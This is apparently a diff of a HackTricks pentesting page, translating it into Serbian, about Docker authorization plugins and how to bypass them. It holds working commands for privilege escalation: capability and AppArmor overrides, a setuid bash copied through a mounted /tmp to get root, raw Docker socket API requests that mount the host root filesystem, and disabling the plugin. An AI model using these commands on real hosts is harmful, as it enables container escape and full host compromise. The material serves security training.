@@ -1,75 +1,70 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Docker’s** out-of-the-box **authorization** model is **all or nothing**. Any user with permission to access the Docker daemon can **run any** Docker client **command**. The same is true for callers using Docker’s Engine API to contact the daemon. If you require **greater access control**, you can create **authorization plugins** and add them to your Docker daemon configuration. Using an authorization plugin, a Docker administrator can **configure granular access** policies for managing access to the Docker daemon.
+**Dockerov** model **autorizacije** je **sve ili ništa**. Svaki korisnik sa dozvolom za pristup Docker demon može **izvršiti bilo koju** Docker klijentsku **komandu**. Isto važi i za pozivaoce koji koriste Dockerov Engine API za kontaktiranje demona. Ako vam je potrebna **veća kontrola pristupa**, možete kreirati **autorizacione plugine** i dodati ih u konfiguraciju vašeg Docker demona. Korišćenjem autorizacionog plugina, Docker administrator može **konfigurisati granularne politike pristupa** za upravljanje pristupom Docker demonu.
 
-# Basic architecture
+# Osnovna arhitektura
 
-Docker Auth plugins are **external** **plugins** you can use to **allow/deny** **actions** requested to the Docker Daemon **depending** on the **user** that requested it and the **action** **requested**.
+Docker Auth plugini su **spoljni** **plugini** koje možete koristiti da **dozvolite/odbacite** **akcije** koje se traže od Docker demona **u zavisnosti** od **korisnika** koji je to zatražio i **akcije** **koja se traži**.
 
-**[The following info is from the docs](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Sledeće informacije su iz dokumentacije](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-When an **HTTP** **request** is made to the Docker **daemon** through the CLI or via the Engine API, the **authentication** **subsystem** **passes** the request to the installed **authentication** **plugin**(s). The request contains the user (caller) and command context. The **plugin** is responsible for deciding whether to **allow** or **deny** the request.
+Kada se napravi **HTTP** **zahtev** ka Docker **demonu** putem CLI-a ili putem Engine API-ja, **sistem** **autentifikacije** **prosledi** zahtev instaliranim **autentifikacionim** **pluginom**. Zahtev sadrži korisnika (pozivaoca) i kontekst komande. **Plugin** je odgovoran za odlučivanje da li da **dozvoli** ili **odbaci** zahtev.
 
-The sequence diagrams below depict an allow and deny authorization flow:
+Dijagrami sekvenci ispod prikazuju tok autorizacije za dozvolu i odbijanje:
 
-![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)
+![Tok dozvole autorizacije](https://docs.docker.com/engine/extend/images/authz_allow.png)
 
-![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)
+![Tok odbijanja autorizacije](https://docs.docker.com/engine/extend/images/authz_deny.png)
 
-Each request sent to the plugin **includes the authenticated user, the HTTP headers, and the request/response body**. Only the **user name** and the **authentication method** used are passed to the plugin. Most importantly, **no** user **credentials** or tokens are passed. Finally, **not all request/response bodies are sent** to the authorization plugin. Only those request/response bodies where the `Content-Type` is either `text/*` or `application/json` are sent.
+Svaki zahtev poslat pluginu **uključuje autentifikovanog korisnika, HTTP zaglavlja i telo zahteva/odgovora**. Samo su **ime korisnika** i **metoda autentifikacije** koja se koristi prosleđeni pluginu. Najvažnije, **nema** korisničkih **akreditiva** ili tokena koji se prosleđuju. Na kraju, **ne šalju se svi zahtevi/tela odgovora** autorizacionom pluginu. Samo se ona tela zahteva/odgovora gde je `Content-Type` ili `text/*` ili `application/json` šalju.
 
-For commands that can potentially hijack the HTTP connection (`HTTP Upgrade`), such as `exec`, the authorization plugin is only called for the initial HTTP requests. Once the plugin approves the command, authorization is not applied to the rest of the flow. Specifically, the streaming data is not passed to the authorization plugins. For commands that return chunked HTTP response, such as `logs` and `events`, only the HTTP request is sent to the authorization plugins.
+Za komande koje potencijalno mogu preuzeti HTTP vezu (`HTTP Upgrade`), kao što je `exec`, autorizacioni plugin se poziva samo za inicijalne HTTP zahteve. Kada plugin odobri komandu, autorizacija se ne primenjuje na ostatak toka. Konkretno, streaming podaci se ne prosleđuju autorizacionim pluginima. Za komande koje vraćaju delimične HTTP odgovore, kao što su `logs` i `events`, samo se HTTP zahtev šalje autorizacionim pluginima.
 
-During request/response processing, some authorization flows might need to do additional queries to the Docker daemon. To complete such flows, plugins can call the daemon API similar to a regular user. To enable these additional queries, the plugin must provide the means for an administrator to configure proper authentication and security policies.
+Tokom obrade zahteva/odgovora, neki tokovi autorizacije mogu zahtevati dodatne upite ka Docker demonu. Da bi se završili takvi tokovi, plugini mogu pozvati API demona slično kao običan korisnik. Da bi omogućili ove dodatne upite, plugin mora obezbediti sredstva za administratora da konfiguriše odgovarajuće politike autentifikacije i bezbednosti.
 
-## Several Plugins
+## Nekoliko plugina
 
-You are responsible for **registering** your **plugin** as part of the Docker daemon **startup**. You can install **multiple plugins and chain them together**. This chain can be ordered. Each request to the daemon passes in order through the chain. Only when **all the plugins grant access** to the resource, is the access granted.
+Vi ste odgovorni za **registraciju** vašeg **plugina** kao deo **pokretanja** Docker demona. Možete instalirati **više plugina i povezati ih**. Ova veza može biti uređena. Svaki zahtev ka demonu prolazi redom kroz ovu vezu. Samo kada **svi plugini odobre pristup** resursu, pristup se odobrava.
 
-# Plugin Examples
+# Primeri plugina
 
 ## Twistlock AuthZ Broker
 
-The plugin [**authz**](https://github.com/twistlock/authz) allows you to create a simple **JSON** file that the **plugin** will be **reading** to authorize the requests. Therefore, it gives you the opportunity to control very easily which API endpoints can reach each user.
+Plugin [**authz**](https://github.com/twistlock/authz) vam omogućava da kreirate jednostavnu **JSON** datoteku koju će **plugin** **čitati** da bi autorizovao zahteve. Stoga, pruža vam priliku da vrlo lako kontrolišete koji API krajnji tačke mogu da dostignu svakog korisnika.
 
-This is an example that will allow Alice and Bob can create new containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+Ovo je primer koji će omogućiti Alisi i Bobu da kreiraju nove kontejnere: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-In the page [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) you can find the relation between the requested URL and the action. In the page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) you can find the relation between the action name and the action
+Na stranici [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) možete pronaći odnos između traženog URL-a i akcije. Na stranici [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) možete pronaći odnos između imena akcije i akcije.
 
-## Simple Plugin Tutorial
+## Jednostavan vodič za plugin
 
-You can find an **easy to understand plugin** with detailed information about installation and debugging here: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
+Možete pronaći **lako razumljiv plugin** sa detaljnim informacijama o instalaciji i debagovanju ovde: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
-Read the `README` and the `plugin.go` code to understand how is it working.
+Pročitajte `README` i `plugin.go` kod da biste razumeli kako funkcioniše.
 
 # Docker Auth Plugin Bypass
 
-## Enumerate access
+## Enumeracija pristupa
 
-The main things to check are the **which endpoints are allowed** and **which values of HostConfig are allowed**.
+Glavne stvari koje treba proveriti su **koje krajnje tačke su dozvoljene** i **koje vrednosti HostConfig su dozvoljene**.
 
-To perform this enumeration you can **use the tool** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
+Da biste izvršili ovu enumeraciju, možete **koristiti alat** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
 
-## disallowed `run --privileged`
+## zabranjeno `run --privileged`
 
-### Minimum Privileges
-
+### Minimalne privilegije
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
+### Pokretanje kontejnera i zatim dobijanje privilegovane sesije
 
-### Running a container and then getting a privileged session
-
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+U ovom slučaju, sysadmin **nije dozvolio korisnicima da montiraju volumene i pokreću kontejnere sa `--privileged` oznakom** ili da daju bilo kakvu dodatnu sposobnost kontejneru:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+Međutim, korisnik može **napraviti shell unutar pokrenutog kontejnera i dati mu dodatne privilegije**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -81,42 +76,38 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
+Sada, korisnik može da pobegne iz kontejnera koristeći neku od [**prethodno diskutovanih tehnika**](./#privileged-flag) i **poveća privilegije** unutar hosta.
 
-Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.
+## Montiranje Writable Folder-a
 
-## Mount Writable Folder
-
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+U ovom slučaju, sysadmin je **onemogućio korisnicima da pokreću kontejnere sa `--privileged` flagom** ili daju bilo kakvu dodatnu sposobnost kontejneru, i dozvolio je samo montiranje `/tmp` foldera:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
 host> /tmp/bash
- -p #This will give you a shell as root
+-p #This will give you a shell as root
 ```
-
 > [!NOTE]
-> Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+> Imajte na umu da možda ne možete montirati folder `/tmp`, ali možete montirati **drugi zapisivi folder**. Možete pronaći zapisive direktorijume koristeći: `find / -writable -type d 2>/dev/null`
 >
-> **Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+> **Imajte na umu da ne podržavaju svi direktorijumi na linux mašini suid bit!** Da biste proverili koji direktorijumi podržavaju suid bit, pokrenite `mount | grep -v "nosuid"`. Na primer, obično `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` ne podržavaju suid bit.
 >
-> Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+> Takođe imajte na umu da ako možete **montirati `/etc`** ili bilo koji drugi folder **koji sadrži konfiguracione fajlove**, možete ih menjati iz docker kontejnera kao root kako biste **zloupotrebili na hostu** i eskalirali privilegije (možda modifikovanjem `/etc/shadow`)
 
-## Unchecked API Endpoint
+## Neprovereni API Endpoint
 
-The responsibility of the sysadmin configuring this plugin would be to control which actions and with which privileges each user can perform. Therefore, if the admin takes a **blacklist** approach with the endpoints and the attributes he might **forget some of them** that could allow an attacker to **escalate privileges.**
+Odgovornost sysadmin-a koji konfiguriše ovaj plugin biće da kontroliše koje akcije i sa kojim privilegijama svaki korisnik može da izvrši. Stoga, ako admin preuzme pristup **crnoj listi** sa endpoint-ima i atributima, može **zaboraviti neke od njih** koji bi mogli omogućiti napadaču da **eskalira privilegije.**
 
-You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Možete proveriti docker API na [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
-## Unchecked JSON Structure
+## Neproverena JSON Struktura
 
-### Binds in root
+### Binds u root
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
-In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
+Moguće je da kada je sysadmin konfigurisao docker firewall, **zaboravio na neki važan parametar** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kao što je "**Binds**".\
+U sledećem primeru moguće je zloupotrebiti ovu pogrešnu konfiguraciju da se kreira i pokrene kontejner koji montira root (/) folder hosta:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -126,38 +117,30 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
-
 > [!WARNING]
-> Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
+> Obratite pažnju na to kako u ovom primeru koristimo parametar **`Binds`** kao ključ na nivou root u JSON-u, ali u API-ju se pojavljuje pod ključem **`HostConfig`**
 
-### Binds in HostConfig
+### Binds u HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Pratite iste instrukcije kao sa **Binds u root** izvršavajući ovaj **request** ka Docker API-ju:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-
 ### Mounts in root
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Pratite iste upute kao sa **Binds in root** izvršavajući ovaj **request** ka Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-
 ### Mounts in HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Pratite iste upute kao sa **Binds in root** izvršavajući ovaj **request** ka Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
+## Neproverena JSON Atribut
 
-## Unchecked JSON Attribute
-
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS_MODULE** capability:
-
+Moguće je da je kada je sistem administrator konfigurisao docker vatrozid **zaboravio na neki važan atribut parametra** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kao što je "**Capabilities**" unutar "**HostConfig**". U sledećem primeru moguće je iskoristiti ovu pogrešnu konfiguraciju da se kreira i pokrene kontejner sa **SYS_MODULE** sposobnošću:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -167,14 +150,12 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
-
 > [!NOTE]
-> The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
+> **`HostConfig`** je ključ koji obično sadrži **zanimljive** **privilegije** za bekstvo iz kontejnera. Međutim, kao što smo prethodno razgovarali, imajte na umu da korišćenje Binds van njega takođe funkcioniše i može vam omogućiti da zaobiđete ograničenja.
 
-## Disabling Plugin
+## Onemogućavanje Plugina
 
-If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!
-
+Ako je **sysadmin** **zaboravio** da **zabraniti** mogućnost **onemogućavanja** **plugina**, možete iskoristiti ovo da ga potpuno onemogućite!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -186,10 +167,9 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
+Zapamtite da **ponovo omogućite dodatak nakon eskalacije**, ili **ponovno pokretanje docker usluge neće raditi**!
 
-Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
-
-## Auth Plugin Bypass writeups
+## Izveštaji o zaobilaženju Auth dodatka
 
 - [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
